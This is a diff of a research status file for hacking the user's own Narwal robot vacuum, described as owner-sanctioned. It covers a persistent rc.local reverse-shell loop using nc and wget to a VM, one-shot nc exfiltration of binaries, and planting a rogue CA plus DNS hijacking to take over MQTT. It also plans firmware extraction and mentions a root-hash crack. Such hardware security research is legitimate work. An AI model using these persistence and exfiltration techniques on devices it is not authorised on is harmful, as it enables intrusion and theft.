@@ -2,84 +2,79 @@
 
 ## Works, live-verified on the real robot
 
-- **Filesystem read** of any regular file over MQTT (`config_content/get`)
-  — text + binary. **The earlier "reads return empty" degradation was
-  client-side bugs in `narwal_access.py` (bad auth frame, paho callback
-  arity, missing response-frame strip) — fixed; reads are reliable.**
-  Ceiling ≥1.2 MB per read (big files are slow, not capped: 1.2 MB ≈ 76 s).
-- **Filesystem overwrite** of any existing file (`config_content/set`)
-  — byte-exact (274 KB CA-bundle round-trip proven).
-- **CA installation** into `/etc/ssl/certs/ca-certificates.crt` — the
-  174th cert in the robot's store; verified still present 2026-11-17.
-- **IPv6 disabled robot-side (2026-11-17)** — appended
-  `net.ipv6.conf.{all,default}.disable_ipv6=1` to `/etc/sysctl.conf`
-  (owner directive; original kept in `robot_dump/etc_sysctl.conf.orig`),
-  rebooted, verified: v6 address dead, v4 alive, robot healthy on cloud.
-  This also permanently kills the "robot prefers IPv6" DNS-hijack leak.
-- **OTA-channel TLS trust**: with the CA installed and the robot
-  rebooted, its `us-open` OTA client accepted our CA-signed leaf on the
-  first attempt (previously first attempts always failed).
-- **OTA oracle** (parent project): the robot downloads packages from any
-  URL our OTA response names and rejects tampered packages via the RSA
-  signature (E1/E2/E3 experiments).
-- **Emulator HTTPS** — SNI-routed, serving all Narwal hosts (now with
-  SNI logging on handshake failures — the 2026-11-17 evening window
-  showed 120 `unknown_ca` rejections from the robot with no SNI record,
-  which that experiment needed).
-- **Offline broker** — mosquitto MQTT5 + our leaf, accepting app-side
-  connections (`control.py` speaks the full command protocol).
+- **ROOT SHELL (persistent)** — one line in `/etc/rc.local` (owner-sanctioned):
+  a backgrounded self-healing reconnect loop over busybox `nc` to the VM
+  (:4545), plus an HTTP-poll command channel (`wget http://10.2.100.2:8081/cmd`
+  every 15 s, output back over :4550). Robot reboots bring both back.
+  Original rc.local kept at `robot_dump/etc_rc.local.orig`.
+- **Filesystem read/write over MQTT** — reliable (the old "degradation" was
+  client bugs, fixed). Ceiling ≥1.2 MB per read; with the shell there is no
+  limit (34 MB `application_node` pulled via nc).
+- **Binary exfil channel** — one-shot nc listeners on the VM
+  (`/opt/exfil_once.sh PORT NAME`); pulled: wireless_communicator_node (3.9 MB),
+  upgrader_node (2.8 MB), application_node (34 MB!), libnrml_security.so,
+  librobokit_platform_domain.so, narwal_rootca.crt, pub_key.pem.
+- **IPv6 disabled robot-side** — verified off across reboots and hijacks.
+- **CA installed** in the system bundle (174th cert) — only affects clients
+  that use the bundle.
 
-## Robot internals mapped (2026-11-17/18 — `robot_dump/`)
+## The architecture (from the pulled binaries + live shell)
 
-ROS Kinetic system launched by `/oem/DISK/bin/pita/start.sh`; nodes:
-map_server, hal, hal_monitor, power_health, mapping, planning,
-application, perception, **wireless_communicator** (the MQTT/cloud
-client), toolkit. Custom libs under `/oem/DISK/bin/pita/lib/`
-(`librobokit_*` all pulled + `libcommon.so` + `libpaho-mqtt3as.so`).
-`toolkit_recorder` (1.05 MB) and the framework libs are in hand for
-decompilation. Logger filenames: `<dir>/<YYYYMMDDHHMM>.<n>.<name>`.
-Endpoints: `robot_dump/robotdata_static_robot_info_domain.ini`.
-
-## Blocked
-
-**The robot's MQTT + device-API channels reject our CA**
-(`unknown_ca`). The 2026-11-18 sentinel window (see
-`robot_dump/experiments/sentinel-2026-11-18/FINDINGS.md`) proved the
-**bootstrap client (iot-auth-global) also uses the private trust
-store** (strict unknown_ca for 10+ min with our CA in the system
-bundle), and that every other cloud channel is gated behind bootstrap
-at boot — the robot has a default/compiled-in MQTT endpoint
-(us-01.mqtt, resolved but never connected). The trust decision lives in
-the `wireless_communicator_node` binary (>read ceiling ~1.2–2 MB, so
-far unreachable via `config_content/get`; no itls/ID² strings in any
-pulled lib; no id2/cert files found under `/robotdata`, `/userdata`,
-`robokit_platform/conf`).
+- ROS Kinetic; nodes incl. **application_node = the MQTT owner**
+  (`mqtt::ssl_options` + paho MQTTAsync inside it — the cloud :8883
+  connection belongs to PID of application_node), wireless_communicator,
+  **upgrader_node** (OTA), plus media/sys_monitor/ecological_agent/
+  robokit_telemetry/product_advance.
+- **THE MQTT TRUST ANSWER** (statically recovered from application_node at
+  0x19aee60): `ssl_options.set_enable_server_cert_auth(true)` +
+  `ca_path("/etc/ssl/certs")` — **the certificate DIRECTORY**, hash-lookup
+  mode. That is why appending to `ca-certificates.crt` (file) and
+  `narwal_rootca.crt` never flipped MQTT: the client only consults
+  `<subject-hash>.0` entries in the dir.
+  **Fix (ready):** drop our CA in as `/etc/ssl/certs/33148072.0` via the
+  root shell (file staged on the VM), then point DNS at the offline broker.
+- **Bootstrap HTTPS (iot-auth-global)** still rejects our CA (unknown_ca,
+  strict, persistent) — different client (curl/Poco-family); unresolved,
+  but NOT needed for MQTT control.
+- **Firmware crypto**: `libnrml_security.so` = aes-256-cbc streaming decrypt
+  (`nrml_security_package_decrypt(src,dst,keyfile)`) with the key in
+  **OP-TEE** (`libteec`, /dev/tee0, RPMB). Standalone calls via ctypes
+  harness reach the TEE and get refused (custom codes 0x4015091/0x4011041).
+  BUT: the upgrader's live log says
+  **`/oem/DISK/bin/pita/firmware_back/` is "already parsed"** — the robot
+  keeps a decrypted firmware staging/backup dir on /oem. Exfil of that dir
+  (after the current cleaning run) likely yields the whole plaintext
+  firmware image without any crypto fight.
+- `usr_bin_swupdate` = crypto-stripped installer (cpio/zlib + Allwinner
+  boot burn via /lib/libota-burnboot.so; NO OpenSSL at all — its
+  aes-key-file loader is dead code). The real verify+decrypt is upgrader+
+  libnrml_security.
+- OTA oracle rebuilt into the emulator (`_ota_check` serves
+  /var/tmp/narwal_cap/ota_override.json; `/fw/<name>` file serving).
+  Live test 2026-11-18: robot checked, got the forced response, download
+  attempt failed (errorCode 固件下载失败 — TLS strict path; E2/E3 proved
+  the lenient path downloads from us). Override disabled while the robot
+  cleans; re-enable after.
 
 ## Next steps (ranked)
 
-1. **Trigger the robot's log-upload flow as the account holder** — the
-   robot reaches for `narwal-robot-logs-06.oss-us-west-1.aliyuncs.com`
-   even while cloud-offline. Drive the app's upload-log API
-   (`/sweeper-log-server/v2/file/getUploadToken` → robot gathers logs →
-   OSS PUT) and fetch the upload: the communicator's logs should name
-   its cert paths / TLS config — no binary needed.
-2. **Bigger-file read tricks** — the read ceiling is a hard RPC cap
-   between 1.2 MB (works, 76 s) and node-binary sizes (silent).
-   Possible: `developer/file_upload` request fuzzing (factory-only
-   proto), breakpad minidumps under `/userdata/mini_dump/*`.
-3. **UART (Track D in the parent repo)** — now trivially productive:
-   full v0 protocol documented, board pads known; the guaranteed path
-   to the communicator binary + itls store if 1–2 stall.
-4. Root-password crack (`$1$` MD5-crypt hash in hand) — mostly moot
-   while file write exists, but useful for UART later.
+1. **After the cleaning run (paused ~1h per owner)**:
+   a. `cd /etc/ssl/certs && wget http://10.2.100.2:8081/ca-33148072.0`
+      → hijack us-01.mqtt DNS → robot should CONNECT to our offline broker
+      → full offline control via `emulator/control.py`.
+   b. Exfil `/oem/DISK/bin/pita/firmware_back/` (decrypted firmware?).
+   c. Re-enable the forced OTA override → let the real upgrader decrypt the
+      genuine npkg → harvest staged plaintext from /userdata/usr/ota/.
+2. Bootstrap HTTPS trust — find that client's CA config (Poco/curl).
+3. Root-password crack — moot with the shell.
 
 ## Operational notes
 
-- **Never run two dynamic_params clients concurrently** against one
-  robot — response topics are shared and replies cross-match (matching
-  is now correlation-strict, but concurrent sessions still race).
-- `/proc` reads return empty (the service reads by file size; procfs
-  reports 0). Directories and symlinks also read as 0 B — use
-  known-path probing (`tools/fsprobe.py`).
-- The robot was rebooted 2026-11-17 23:22 (IPv6 apply + verify); it came
-  back healthy on the real cloud, docked.
+- Never run two dynamic_params MQTT clients concurrently (response
+  cross-matching; matching now correlation-strict).
+- Robot-side persistence survives reboots; rollback = write
+  `etc_rc.local.orig` back (MQTT) + remove the hashed CA + revert DNS.
+- The VM now runs: emulator :443 (oracle-capable), offline mosquitto :8883
+  TLS + :1884 plaintext, revshell listener :4545, cmd HTTP :8081 +
+  collector :4550, dnsmasq (us-open-only override active during the
+  cleaning pause; MQTT/bootstrap resolve real).
